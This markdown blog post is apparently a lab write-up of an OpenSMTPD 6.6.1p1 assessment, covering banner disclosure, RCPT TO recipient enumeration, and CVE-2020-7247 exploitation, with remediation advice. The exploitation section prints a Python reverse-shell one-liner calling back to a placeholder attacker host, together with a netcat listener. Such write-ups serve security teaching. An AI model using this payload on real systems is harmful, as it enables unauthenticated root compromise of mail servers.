@@ -1,0 +1,219 @@
+---
+title: "OpenSMTPD: From SMTP Exposure to Remote Code Execution"
+description: "A systematic security assessment of an intentionally vulnerable OpenSMTPD 6.6.1p1 environment, covering banner-based version disclosure, recipient enumeration, CVE-2020-7247 validation, remote command execution, and privileged shell access."
+slug: smtp
+category: "cybersecurity"
+subcategory: "network-security"
+protocol: "SMTP"
+tags:
+  - SMTP
+  - OpenSMTPD
+  - CVE-2020-7247
+  - Remote Code Execution
+  - Recipient Enumeration
+  - Reverse Shell
+status: "complete"
+pubDate: 2026-09-27
+draft: false
+---
+
+# Overview
+
+Most people think of SMTP as the boring, background protocol that just moves mail from one server to another. This assessment was built to test that assumption — specifically, to see what happens when the mail server on the other end is running a version of OpenSMTPD with a known, unauthenticated remote code execution bug baked into it.
+
+The lab starts the way most real engagements do: a port scan, a banner grab, and a bit of poking at the protocol itself to see what the service gives away. Once the exact OpenSMTPD version was confirmed, it was checked against public vulnerability databases, which pointed straight at CVE-2020-7247. From there, the assessment moves from "this looks vulnerable on paper" to "this is actually exploitable" — first with a harmless proof-of-concept command, then with a full reverse shell back to the attacker machine.
+
+Everything here was done inside an isolated lab. No real mail infrastructure, no external systems — just an intentionally broken OpenSMTPD build and a Kali box on the other end.
+
+## Lab Environment
+
+The target was an Ubuntu host running a deliberately vulnerable, source-built copy of OpenSMTPD 6.6.1p1, installed separately from the system's normal mail packages. A Kali Linux machine acted as the attacker throughout — service discovery, SMTP interaction, and the eventual exploitation all happened from there.
+
+**Exposed service:**
+
+```text
+25/tcp → SMTP (OpenSMTPD 6.6.1p1)
+```
+
+**Target hostname:**
+
+```text
+pawanubuntu
+```
+
+**SMTP banner:**
+
+```text
+220 pawanubuntu ESMTP OpenSMTPD 6.6.1p1
+```
+
+**Install location (built from source, kept separate from the host's default mail stack):**
+
+```text
+/opt/opensmtpd-6.6.1/
+/opt/opensmtpd-6.6.1/etc/smtpd.conf
+```
+
+The lab had no connection to any real mail infrastructure — every step below, from the initial scan to the final shell, happened entirely between the two lab machines.
+
+### Objective
+
+Figure out whether the exposed OpenSMTPD service could be used to confirm the existence of an `admin` mailbox through normal SMTP interaction, and — more importantly — whether the identified vulnerable version could be abused by an unauthenticated remote attacker to run arbitrary commands on the underlying OS and reach privileged access.
+
+---
+
+# 01 — Reconnaissance & Service Enumeration
+
+Since the target was only exposing SMTP, the scan was narrowed straight to port 25 instead of running a full port sweep:
+
+```bash
+nmap -sV -sC demo.pawanr.local -p 25
+```
+
+**Nmap Results**
+
+![Nmap version and script scan against port 25 showing the OpenSMTPD banner and supported SMTP commands](/images/writeups/smtp/nmap-scan-results.png)
+
+### Initial Observations
+
+- `25/tcp` — open, running **OpenSMTPD 6.6.1p1**
+- The banner itself handed over the exact software and version with no effort required: `220 pawanubuntu ESMTP OpenSMTPD 6.6.1p1`
+- Nmap's SMTP scripts also enumerated the supported command set (`8BITMIME`, `ENHANCEDSTATUSCODES`, `SIZE`, `DSN`, `HELP`), confirming the service was reachable and responsive to standard SMTP interaction
+
+A banner that explicit is basically doing half the reconnaissance for an attacker — there was no need to guess the version or fingerprint it indirectly, it was handed over on connect.
+
+---
+
+# 02 — Recipient Enumeration via SMTP Commands
+
+Before jumping into exploitation, it was worth checking what the service would reveal through plain SMTP conversation — specifically, whether it would confirm or deny that a given mailbox existed.
+
+```bash
+nc 192.168.64.12 25
+```
+
+```text
+EHLO test
+MAIL FROM:<test@test>
+RCPT TO:<admin@pawanubuntu>
+```
+
+**Recipient Validation via RCPT TO**
+
+![Netcat SMTP session showing EHLO, MAIL FROM, and RCPT TO for admin@pawanubuntu returning a valid recipient response](/images/writeups/smtp/recipient-enumeration-rcpt-to.png)
+
+The server responded with `250 2.1.5 Destination address valid: Recipient ok` for `admin@pawanubuntu` — a clean, unambiguous confirmation that the mailbox exists. A nonexistent recipient produced a different response, which is exactly the kind of behavioral difference that lets an attacker enumerate valid usernames one `RCPT TO` at a time, without ever authenticating.
+
+### Security Observation
+
+On its own, recipient enumeration is a low-to-medium severity issue — it doesn't get anyone into the system, but it does hand over a list of valid usernames for free, which is genuinely useful groundwork for phishing or credential-stuffing later. Combined with the version disclosure from Section 01, the service was already giving away more than it should before any exploitation had even started.
+
+---
+
+# 03 — Vulnerability Research
+
+With the exact version confirmed as OpenSMTPD 6.6.1p1, the next step was checking whether that specific build had any known, weaponized vulnerabilities.
+
+```bash
+searchsploit OPENSMTPD 6.6.1
+```
+
+**Searchsploit Results**
+
+![searchsploit output listing OpenSMTPD exploits, including a remote code execution entry for 6.6.1](/images/writeups/smtp/searchsploit-opensmtpd-results.png)
+
+Searchsploit returned several matching entries, including a remote code execution exploit that lined up exactly with the installed version. That exploit corresponds to **CVE-2020-7247** — a vulnerability in OpenSMTPD's SMTP server component that allows an unauthenticated remote attacker to execute arbitrary commands, in this case as root.
+
+---
+
+# 04 — CVE-2020-7247 Exploitation
+
+Rather than firing the exploit blind, the public Python proof-of-concept was reviewed first to understand exactly how it constructed its command-execution payload — this mattered for setting up the listener correctly and knowing what to expect on the wire.
+
+A Netcat listener was started on the attacker machine to catch the callback:
+
+```bash
+nc -lvnp 4444
+```
+
+The exploit was then run against the target, using a Python-based payload designed to open a socket back to the attacker and spawn an interactive shell:
+
+```bash
+python3 ~/47984.py Target_IP 25 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"Attacker_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"'
+```
+
+**Exploit Execution**
+
+![Python exploit output confirming OpenSMTPD was detected, connected, and the payload sent successfully](/images/writeups/smtp/python-reverse-shell-payload.png)
+
+The exploit script confirmed OpenSMTPD had been detected, connected to the target, and sent the payload — all without needing any SMTP credentials or prior access.
+
+---
+
+# 05 — Reverse Shell & Post-Exploitation Validation
+
+Back on the listener, the connection came in almost immediately.
+
+```text
+listening on [any] 4444 ...
+connect to [Attacker_IP] from (UNKNOWN) [Target_IP] 60160
+```
+
+**Reverse Shell Access**
+
+![Netcat listener receiving a callback and confirming root-level command execution via id and hostname](/images/writeups/smtp/netcat-listener-shell-access.png)
+
+Running `id` and `hostname` inside the new shell confirmed the execution context:
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+hostname
+# pawanubuntu
+```
+
+The shell came back as **root**, not a limited service account. There was no privilege escalation step needed here — CVE-2020-7247 handed over full root execution directly, which is what pushes this from "critical" to about as bad as a single-CVE exploit chain gets.
+
+---
+
+# Business Impact
+
+Successful exploitation of the vulnerable OpenSMTPD service let an unauthenticated attacker run arbitrary commands on the underlying system and land an interactive root shell — no credentials, no prior foothold, nothing beyond network access to port 25.
+
+In a real deployment, that level of access would expose mail data, system files, credentials, and anything else reachable from the host. Beyond just reading data, an attacker in this position could modify or delete it, disrupt mail delivery entirely, plant persistence, or use the compromised mail server as a pivot point into the rest of the network.
+
+The recipient enumeration and version disclosure covered earlier compound this: an attacker doesn't even need to guess the vulnerable version or blindly probe for valid mailboxes — the service tells them both, before a single exploit attempt is made.
+
+---
+
+# Findings Summary
+
+| # | Finding | Severity | Evidence |
+|---|---|---|---|
+| F01 | Remote Code Execution in OpenSMTPD 6.6.1p1 (CVE-2020-7247) | Critical | Crafted SMTP-triggered payload resulted in arbitrary command execution as root; confirmed via reverse shell and `id`/`hostname` |
+| F02 | SMTP recipient enumeration via `RCPT TO` response differences | Low  | `RCPT TO:<admin@pawanubuntu>` returned `250 Destination address valid`, while a nonexistent recipient produced a distinguishable response |
+| F03 | Vulnerable OpenSMTPD version disclosed in SMTP banner | Low | Banner explicitly returned `OpenSMTPD 6.6.1p1` on connect |
+
+**Overall risk before remediation:** Critical — an unauthenticated attacker with nothing more than network access to port 25 can reach a root shell on the underlying host.
+
+---
+
+# Remediation
+
+- **Upgrade OpenSMTPD** — replace 6.6.1p1 with a current, patched, supported release; CVE-2020-7247 is fixed in later versions
+- **Restrict SMTP exposure** — limit TCP/25 access to systems that genuinely need it rather than leaving it open to any source
+- **Run with least privilege** — ensure the mail service isn't operating with more privilege than it needs, and that privilege separation is configured correctly
+- **Reduce banner disclosure** — avoid exposing the exact software version in the SMTP banner where possible
+- **Limit recipient enumeration** — configure the service so valid and invalid recipients don't produce distinguishable responses
+- **Monitor SMTP traffic** — watch for repeated `RCPT TO` probing, malformed commands, and unusual connection patterns
+- **Retest after remediation** — confirm the vulnerable behavior is gone and the service no longer responds to the CVE-2020-7247 payload
+
+---
+
+# Lessons Learned
+
+This one was a genuinely good hands-on exercise. Building OpenSMTPD from source, working through configuration issues, and troubleshooting the exploit when it didn't immediately behave taught me a lot more than just running a ready-made script against a target and getting a shell on the first try.
+
+From a VAPT angle, it reinforced something I keep coming back to at work too: following the full attack path matters more than the exploit itself. Discovery, banner analysis, recipient validation, matching the version to a real CVE, and only then moving to exploitation — each step fed into the next, and skipping any of them would have meant either missing the vulnerability entirely or firing an exploit without understanding why it worked.
+
+The part I enjoyed most was actually diagnosing what was going wrong each time the payload didn't behave as expected. Getting that root shell after working through those failures felt earned rather than handed to me, and it left me with a much clearer picture of how this vulnerability actually behaves from the attacker's side — not just that it exists.
